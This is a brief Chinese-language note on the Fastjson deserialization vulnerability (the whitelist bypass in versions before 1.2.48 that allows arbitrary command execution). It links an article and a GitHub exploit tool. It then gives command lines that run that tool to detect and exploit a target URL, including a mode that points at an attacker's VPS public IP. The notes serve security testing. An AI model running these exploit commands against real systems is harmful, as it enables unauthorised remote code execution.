## 应用简介

Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中

Fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链

Fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令

[Fastjson反序列化漏洞的检测和利用](https://mp.weixin.qq.com/s?__biz=MzIyNzY1MzUxMQ==&mid=100000244&idx=1&sn=801c947da8f74a4bda5039994951f040&chksm=685ca31c5f2b2a0a414e2848cc7f6e5a6778bbd309fc8d46bb4f4c7769d9f43ae06e0bae4959#rd)

**Fastjson 反序列化漏洞快速检测和利用工具**

https://github.com/21superman/fastjson_exploit

```bash
检测： java -jar fastjson_exploit-1.0-SNAPSHOT-all.jar -u 目标url

利用： java -jar fastjson_exploit-1.0-SNAPSHOT-all.jar -e -u 目标url

vps环境: java -jar fastjson_exploit-1.0-SNAPSHOT-all.jar -e -H vps公网ip -u 目标url
```

一个简单的Fastjson反序列化检测burp插件

？？自己的工具包里有